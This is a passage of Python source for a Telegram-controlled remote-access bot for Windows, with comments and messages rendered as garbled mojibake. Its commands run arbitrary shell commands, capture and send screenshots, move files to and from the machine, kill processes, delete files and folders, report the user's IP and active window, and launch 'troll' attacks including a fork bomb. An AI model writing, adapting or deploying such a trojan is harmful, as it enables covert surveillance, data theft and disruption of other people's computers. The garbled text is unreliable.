import os, logging, pyautogui, asyncio, keyboard, psutil

from aiogram import Dispatcher, Bot, types
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext

from shutil import rmtree
from ctypes import windll
from random import randint
from pygetwindow import getActiveWindowTitle
from webbrowser import open as webopen
from datetime import datetime
from screen_brightness_control import set_brightness, get_brightness

from machine import WindowsMachine
from sound import Sound
from binds import bindAPI


TOKEN = ""  # –¢–æ–∫–µ–Ω –±–æ—Ç–∞ –∏–∑ BotFather
ADMINS = [1215122907]  # –°–ø–∏—Å–æ–∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤ –±–æ—Ç–∞
BINDS_ROUTE = r'binds'  # –ü—É—Ç—å –¥–æ –ø–∞–ø–∫–∏ —Å –±–∏–Ω–¥–∞–º–∏
LOGGING = True  # –í–∫–ª—é—á–∏—Ç—å –ª–æ–≥–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ –∫–æ–Ω—Å–æ–ª–∏ –≤—Å–µ—Ö, –∫—Ç–æ –ø—ã—Ç–∞–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞ (True - –ª–æ–≥–∏—Ä–æ–≤–∞—Ç—å / False - –Ω–µ—Ç)

# FAST_KEYS = ["enter", "backspace", "space", "tab", "ctrl+a", "ctrl+z", "ctrl+c", "ctrl+v", "ctrl+s", "ctrl+shift+esc"]  # –ë—ã—Å—Ç—Ä—ã–µ –∫–ª–∞–≤–∏—à–∏ (–∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ –º–µ–Ω—é –∫–ª–∞–≤–∏—à) (–≤—Ä–µ–º–µ–Ω–Ω–æ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç)
# FAST_CMDS = ['tasklist', 'ping']  # –ë—ã—Å—Ç—Ä—ã–µ –∫–æ–º–∞–Ω–¥—ã (–∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –ø—Ä–∏ –≤–≤–æ–¥–µ –∫–æ–º–∞–Ω–¥) (–≤—Ä–µ–º–µ–Ω–Ω–æ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç)
TROLL_WEBSITES = ['https://dzen.ru', 'https://youtube.com', 'https://www.google.com', 'https://yandex.ru', 'https://vk.com']  # –°–∞–π—Ç—ã –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è –≤ —Ç—Ä–æ–ª–ª–∏–Ω–≥–µ (–∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –ø—Ä–∏ —Ç—Ä–æ–ª–ª–∏–Ω–≥–µ –º–∞—Å—Å–æ–≤—ã–º –æ—Ç–∫—Ä—ã—Ç–∏–µ–º —Å–∞–π—Ç–æ–≤)

VERSION = '4.0'  # –í–µ—Ä—Å–∏—è –±–æ—Ç–∞
COMMAND_LIST = {
    'start': '—Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥ –±–æ—Ç–∞',
    'console': '–æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –≤ –∫–æ–Ω—Å–æ–ª—å',
    'screen': '—Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç',
    'open_site': '–æ—Ç–∫—Ä—ã—Ç—å —Å–∞–π—Ç',
    'create_error': '—Å–æ–∑–¥–∞—Ç—å –æ—à–∏–±–∫—É',
    'processes': '–ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤',
    'kill_process': '—É–±–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å',
    'reboot': '–ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä',
    'off_pc': '–≤—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä',
    'logout': '–≤—ã–π—Ç–∏ –∏–∑ —Ç–µ–∫—É—â–µ–π —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏',
    'setvolume': '—É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å',
    'setbright': '—É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —è—Ä–∫–æ—Å—Ç—å',
    'pc_info': '–ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ü–ö',
    'create_file': '—Å–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª',
    'create_folder': '—Å–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É',
    'delete_file': '—É–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª',
    'delete_folder': '—É–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É',
    'change_file': '–∏–∑–º–µ–Ω–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞',
    'clean_file': '–æ—á–∏—Å—Ç–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞',
    'download_on': '–≤—ã–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –ù–ê –∫–æ–º–ø—å—é—Ç–µ—Ä',
    'download_from': '–∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –° –∫–æ–º–ø—å—é—Ç–µ—Ä–∞',
    'write': '–Ω–∞–ø–µ—á–∞—Ç–∞—Ç—å —Ç–µ–∫—Å—Ç –∫–∞–∫ —Å –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã',
    'hotkey': '–∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≥–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏ –∫–∞–∫ —Å –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã',
    'fork_troll': '—Ç—Ä–æ–ª–ª–∏–Ω–≥ "Fork Bomb" (start %0 %0)',
    'mouse_troll': '—Ç—Ä–æ–ª–ª–∏–Ω–≥ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ–º –º—ã—à–∫–∏',
    'explorer_troll': '—Ç—Ä–æ–ª–ª–∏–Ω–≥ –º–∞—Å—Å–æ–≤—ã–º –æ—Ç–∫—Ä—ã—Ç–∏–µ–º –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞',
    'web_troll': '—Ç—Ä–æ–ª–ª–∏–Ω–≥ –º–∞—Å—Å–æ–≤—ã–º –æ—Ç–∫—Ä—ã—Ç–∏–µ–º —Å–∞–π—Ç–æ–≤',
    'bind_list': '–ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ —Å –±–∏–Ω–¥–∞–º–∏',
    'bind_create': '—Å–æ–∑–¥–∞—Ç—å –±–∏–Ω–¥',
    'bind_del': '—É–¥–∞–ª–∏—Ç—å –±–∏–Ω–¥',
    'bind_read': '–Ω–∞—á–∞—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –±–∏–Ω–¥–∞'
}

GB = 10 ** 9
pyautogui.FAILSAFE = False
logging.basicConfig(level=logging.INFO)

class ControlStates(StatesGroup):
    ERROR_SET_BODY = State()
    FILE_SET_NEW_CONTENT = State()
    BIND_CREATE_CODE = State()

bot = Bot(TOKEN)
dp = Dispatcher()
device = WindowsMachine(bot)
sound = Sound()

def make_temp_folder() -> bool:
    os.mkdir(r'C:\temp')
    kernel32 = windll.kernel32
    kernel32.SetFileAttributesW(r'C:\temp', kernel32.GetFileAttributesW(r'C:\temp') | 2)
    return True

async def is_access(user: types.User) -> bool:
    if LOGGING: print(user.id, user.username, user.first_name, sep='|')
    ADMINS.append((await bot.get_me()).id)

    return user.id in ADMINS

def upload_file(file: str, filename: str | None = None):
    return types.FSInputFile(file, filename)

# /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

@dp.message(CommandStart(ignore_case=True))
async def start_cmd(message: types.Message, state: FSMContext):
    if not await is_access(message.from_user): return

    commands_string = ""
    for i in COMMAND_LIST:
        commands_string += f"\n/{i} - {COMMAND_LIST[i]}"

    await state.clear()
    return await message.reply(F"üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å! –í–æ—Ç —Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥:\n{commands_string}")


@dp.message(Command('console_cmd', 'cmd_console', 'console'))
async def console_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /console_cmd <–∫–æ–º–∞–Ω–¥–∞>")
    
    message_ = await message.reply("–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è, –æ–∂–∏–¥–∞–π—Ç–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞...")
    output = await device.console_cmd(command.args.strip())
    await message_.delete()
    if len(output) > 999:
        if not os.path.exists(r'C:\temp'): make_temp_folder()

        with open(r'C:\temp\ConsoleOutput.txt', 'w+', encoding='utf-8') as f:
            f.write(output)

        await message.reply_document(document=upload_file(r'C:\temp\ConsoleOutput.txt'), caption=f'‚òëÔ∏è –ö–æ–º–∞–Ω–¥–∞ *{command.args.strip()}* —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞\n\n–û—Ç–≤–µ—Ç –æ—Ç –∫–æ–Ω—Å–æ–ª–∏ –æ–∫–∞–∑–∞–ª—Å—è *—Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–º* –∏ –±—ã–ª *—Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ —Ñ–∞–π–ª*!', parse_mode="Markdown")
        return os.remove(r'C:\temp\ConsoleOutput.txt')
    
    return await message.reply(f"‚òëÔ∏è –ö–æ–º–∞–Ω–¥–∞ *{message.text.strip()}* —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞\n\nüì° –û—Ç–≤–µ—Ç –æ—Ç –∫–æ–Ω—Å–æ–ª–∏:\n{output}", parse_mode="Markdown")


@dp.message(Command('screen', 'screenshot'))
async def screenshot_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    screenshots = await device.screenshot()
    upload_files = [types.InputMediaPhoto(media=upload_file(i)) for i in screenshots]
    await message.reply_media_group(upload_files)
    for screen in screenshots:
        os.remove(screen)


@dp.message(Command("open_site", "open_web"))
async def open_site_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /open_site <—Å—Å—ã–ª–∫–∞>")
    
    webopen(command.args.strip(), 2)
    return await message.reply(f'‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã–ª–∏ {command.args.strip()}*', parse_mode='Markdown')


# /////// CREATE ERROR SYSTEM BEGIN ///////
@dp.message(Command("create_error", "error"))
async def create_error_cmd(message: types.Message, command: CommandObject, state: FSMContext):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /error <–∑–∞–≥–æ–ª–æ–≤–æ–∫ –æ—à–∏–±–∫–∏>")
    
    await message.reply("‚úèÔ∏è –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–ª–µ–¥—É—é—â–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º —Ç–µ–∫—Å—Ç (—Ç–µ–ª–æ) –æ—à–∏–±–∫–∏. –î–ª—è –æ—Ç–º–µ–Ω—ã –≤–≤–µ–¥–∏—Ç–µ /start")

    await state.set_data({'title': command.args.strip()})
    await state.set_state(ControlStates.ERROR_SET_BODY)


@dp.message(ControlStates.ERROR_SET_BODY)
async def create_error_cmd_body(message: types.Message, state: FSMContext):
    if not await is_access(message.from_user): return

    if '/start' in message.text.strip():
        await message.reply("üò´ –í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ —Å–æ–∑–¥–∞–Ω–∏–µ –æ—à–∏–±–∫–∏!")
        return await state.clear()
    
    title = (await state.get_data())['title']
    await state.clear()
    await message.reply('‚ùóÔ∏è *–û—à–∏–±–∫–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞!*', parse_mode='Markdown')
    return windll.user32.MessageBoxW(0, message.text.strip(), title, 0x1000)
# /////// CREATE ERROR SYSTEM END ///////


@dp.message(Command('processes', 'process_list'))
async def process_list_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    processes = '–°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤:\n\n'
    for i in psutil.pids():
        try: processes+=f'ID: {i}\n–ù–∞–∑–≤–∞–Ω–∏–µ: {psutil.Process(i).name()}\n–ü—É—Ç—å: P{psutil.Process(i).exe()}\n\n'    
        except: continue

    with open("processes.txt", "w+", encoding="utf-8") as file:
        file.write(processes)

    await message.reply_document(upload_file("processes.txt"), caption='‚òëÔ∏è C–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –±—ã–ª *—Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ —Ñ–∞–π–ª –Ω–∏–∂–µ*!\n\n–í–≤–µ–¥–∏—Ç–µ *ID –ø—Ä–æ—Ü–µ—Å—Å–∞* –¥–ª—è —É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è –∏–ª–∏ *–Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É "–ù–∞–∑–∞–¥"*', parse_mode="Markdown")
    return os.remove("processes.txt")


@dp.message(Command("kill_process", "kprocess"))
async def kill_process_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /kill_process <id –ø—Ä–æ—Ü–µ—Å—Å–∞>")

    elif not command.args.strip().isdigit():
        return await message.reply("‚ùå *–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞! ID –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º*", parse_mode='Markdown')
    
    kill_id = int(command.args.strip())
    parent = psutil.Process(kill_id)

    try:
        for child in parent.children(recursive=True): child.kill()
        parent.kill()
        
    except psutil.NoSuchProcess: return await message.reply( '‚ùå *–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞! –ü—Ä–æ—Ü–µ—Å—Å–∞ —Å —Ç–∞–∫–∏–º ID –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç*', parse_mode='Markdown')
    except psutil.AccessDenied: return await message.reply('‚ùå *–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞! –î–ª—è —É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è –¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤*', parse_mode='Markdown')
    finally: return await message.reply(f'‚òëÔ∏è –ü—Ä–æ—Ü–µ—Å—Å —Å ID *{kill_id}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ —É–Ω–∏—á—Ç–æ–∂–µ–Ω!', parse_mode='Markdown')


@dp.message(Command("reboot", "restart"))
async def reboot_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    await message.reply("‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã–∑–≤–∞–ª–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É –ü–ö*!", parse_mode='Markdown')
    return await device.console_cmd("shutdown -r -t 0")

@dp.message(Command("off_pc", "pc_off"))
async def pc_off_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    await message.reply("‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã–∑–≤–∞–ª–∏ –≤—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö*!")
    return await device.console_cmd("shutdown /s /t 0")

@dp.message(Command("logout"))
async def logout_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    await message.reply("‚òëÔ∏è –í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã–∑—ã–≤–∞–ª–∏ –≤—ã—Ö–æ–¥ –∏–∑ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏!")
    return await device.console_cmd("shutdown /l")


@dp.message(Command("setvolume", "volume"))
async def setvolume_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None:
        return await message.reply(f"üîß –¢–µ–∫—É—â–∏–π —É—Ä–æ–≤–µ–Ω—å –≥—Ä–æ–º–∫–æ—Å—Ç–∏ - *{Sound.current_volume()}*\n–î–ª—è –µ–≥–æ –∏–∑–º–µ–Ω–µ–Ω–∏—è –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /setvolume <0-100>", parse_mode='Markdown')
    
    level = command.args.strip()
    if not level.isdigit():
        return await message.reply("‚ùå *–£—Ä–æ–≤–µ–Ω—å –≥—Ä–æ–∫–º–æ–∫—Å—Ç–∏ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º!*", parse_mode='Markdown')
    
    elif int(level) < 0 or int(level) > 100:
        return await message.reply("‚ùå *–£—Ä–æ–≤–µ–Ω—å –≥—Ä–æ–º–∫–æ—Å—Ç–∏ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –º–µ–Ω—å—à–µ 0 –∏–ª–∏ –±–æ–ª—å—à–µ 100!*", parse_mode='Markdown')
    
    await sound.volume_set(int(level))
    return await message.reply(f"‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ —É—Ä–æ–≤–µ–Ω—å –≥—Ä–æ–º–∫–æ—Å—Ç–∏ *{level}*!", parse_mode='Markdown')


@dp.message(Command("setbright", "bright"))
async def setbright_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None:
        return await message.reply(f"üîß –¢–µ–∫—É—â–∏–π —É—Ä–æ–≤–µ–Ω—å —è—Ä–∫–æ—Å—Ç–∏ - *{get_brightness()[0]}*\n–î–ª—è –µ–≥–æ –∏–∑–º–µ–Ω–µ–Ω–∏—è –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /setbright <0-100>", parse_mode='Markdown')
    
    level = command.args.strip()
    if not level.isdigit():
        return await message.reply("‚ùå *–£—Ä–æ–≤–µ–Ω—å —è—Ä–∫–æ—Å—Ç–∏ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º!*", parse_mode='Markdown')
    
    elif int(level) < 0 or int(level) > 100:
        return await message.reply("‚ùå *–£—Ä–æ–≤–µ–Ω—å —è—Ä–∫–æ—Å—Ç–∏ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –º–µ–Ω—å—à–µ 0 –∏–ª–∏ –±–æ–ª—å—à–µ 100!*", parse_mode='Markdown')
    
    set_brightness(int(level))
    return await message.reply(f"‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ —É—Ä–æ–≤–µ–Ω—å —è—Ä–∫–æ—Å—Ç–∏ *{level}*!", parse_mode='Markdown')


@dp.message(Command("pc_info", "info_pc"))
async def pc_info(message: types.Message):
    if not await is_access(message.from_user): return

    message_ = await message.reply("üò£ –ò–¥–µ—Ç —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö, –æ–∂–∏–¥–∞–π—Ç–µ...")

    await device.update()
    active_window = getActiveWindowTitle()
    if active_window is None or active_window == '':
        active_window = '–†–∞–±–æ—á–∏–π —Å—Ç–æ–ª'

    message_text = (f"üìå –¢–µ–∫—É—â–∏–µ –ø–æ–∫–∞–∑–∞—Ç–µ–ª–∏ –ü–ö\n\n"
           f"üíæ –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è - *{device.login}*\nü™ë –û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ - *{device.oper[0]} {device.oper[2]} {device.oper[3]}*\n"
           f"üßÆ –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä - *{device.oper[5]}*\nüòª –û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å: *–î–æ—Å—Ç—É–ø–Ω–æ {int(device.virtual_memory[0] / 1e+9)} –ì–ë | –ó–∞–≥—Ä—É–∂–µ–Ω–æ {device.virtual_memory[2]}%*\n"
           f"üîã –ë–∞—Ç–∞—Ä–µ—è –∑–∞—Ä—è–∂–µ–Ω–∞ –Ω–∞ *{device.battery}*\nüñ• –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞ - *{device.width}x{device.height}*\n"
           f"üìÄ –ü–∞–º—è—Ç—å: *{device.total_mem/GB:.2f}* –ì–ë –≤—Å–µ–≥–æ, –æ—Å—Ç–∞–ª–æ—Å—å *{device.free_mem/GB:.2f}* –ì–ë\n"
           f"üîë IP –∞–¥—Ä–µ—Å –∑–∞–ø—É—Å—Ç–∏–≤—à–µ–≥–æ - *{device.ip['ip']}*\n"
           f"üñº –ê–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ - *{active_window}*")
    
    await message_.delete()
    return await message.reply(message_text, parse_mode='Markdown')


@dp.message(Command("create_file", "file_create"))
async def create_file_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /create_file <–Ω–∞–∑–≤–∞–Ω–∏–µ/–ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞>")
    
    with open(command.args.strip(), 'w+'):
        pass

    return await message.reply(f"‚òëÔ∏è –§–∞–π–ª *{command.args.strip()}* —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω!", parse_mode="Markdown")


@dp.message(Command("create_folder", "folder_create"))
async def create_folder_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /create_folder <–Ω–∞–∑–≤–∞–Ω–∏–µ/–ø—É—Ç—å –¥–æ –ø–∞–ø–∫–∏>")
    
    try: os.mkdir(command.args.strip())
    except Exception as e: return await message.reply(f"‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –ø–∞–ø–∫–∏: {e}")
    finally: return await message.reply(f"*‚òëÔ∏è –ü–∞–ø–∫–∞ –ø–æ –ø—É—Ç–∏ *{command.args.strip()}* –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞!*", parse_mode='Markdown')


@dp.message(Command("delete_file", "delfile"))
async def delete_file_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /delete_file <–Ω–∞–∑–≤–∞–Ω–∏–µ/–ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞>")
    
    try: os.remove(command.args.strip())
    except Exception as e: return await message.reply(f"‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞: {e}")
    finally: return await message.reply(f"*‚òëÔ∏è –§–∞–π–ª –ø–æ –ø—É—Ç–∏ *{command.args.strip()}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª—ë–Ω!*", parse_mode='Markdown')


@dp.message(Command("delete_folder", "delfolder"))
async def delete_folder_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /delete_folder <–ø—É—Ç—å –¥–æ –ø–∞–ø–∫–∏>")
    
    try: rmtree(command.args.strip())
    except Exception as e: return await message.reply(f"‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –ø–∞–ø–∫–∏: {e}")
    finally: return await message.reply(f"*‚òëÔ∏è –ü–∞–ø–∫–∞ –ø–æ –ø—É—Ç–∏ *{command.args.strip()}* –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω–∞!*", parse_mode='Markdown')


# /////// CHANGE FILE SYSTEM BEGIN ///////
@dp.message(Command("change_file", "file_change"))
async def change_file_cmd(message: types.Message, command: CommandObject, state: FSMContext):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /change_file <–ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞>")
    
    if not os.path.exists(command.args.strip()):
        return await message.reply("‚ùå –£–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!")
    
    await state.set_state(ControlStates.FILE_SET_NEW_CONTENT)
    await state.set_data({'path': command.args.strip()})
    return await message.reply("‚úçÔ∏è *–£–∫–∞–∂–∏—Ç–µ –Ω–æ–≤–æ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ!*", parse_mode="Markdown")

@dp.message(ControlStates.FILE_SET_NEW_CONTENT)
async def change_file_finish(message: types.Message, state: FSMContext):
    if not await is_access(message.from_user): return

    route = (await state.get_data())['path']
    await state.clear()
    try:
        with open(route, 'w+') as f:
            f.write(message.text.strip())
    
    except Exception as e: return await message.reply(f"‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞: {e}")
    finally: return await message.reply(f"‚òëÔ∏è –§–∞–π–ª *{route}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω!", parse_mode='Markdown')
# /////// CHANGE FILE SYSTEM END ///////


@dp.message(Command("clean_file", "file_clean"))
async def clean_file_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /change_file <–ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞>")
    
    if not os.path.exists(command.args.strip()):
